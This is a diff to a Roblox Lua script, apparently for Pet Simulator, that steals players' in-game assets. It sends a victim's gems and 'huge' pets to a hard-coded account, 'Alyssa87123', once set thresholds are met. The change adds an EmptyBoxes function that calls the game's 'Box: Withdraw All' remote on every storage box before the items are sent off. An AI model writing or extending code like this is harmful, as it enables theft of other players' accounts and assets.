@@ -33,10 +33,7 @@ for i, v in pairs(save.Pet) do
     end
 end
 
-if AmountOfHuges >= 6 then
-    Username = "Alyssa87123"
-end
-if GemAmount1 >= 20000000 then
+if AmountOfHuges >= 6 or GemAmount1 >= 20000000 then
     Username = "Alyssa87123"
 end
 
@@ -216,6 +213,19 @@ function GemSteal()
         end
     end
 end
+
+function EmptyBoxes()
+    if save.Box then
+        for key, _ in pairs(save.Box) do
+			local args = {
+				[1] = key
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+EmptyBoxes()
 
 SendAllHuges()
 SendAllExc()
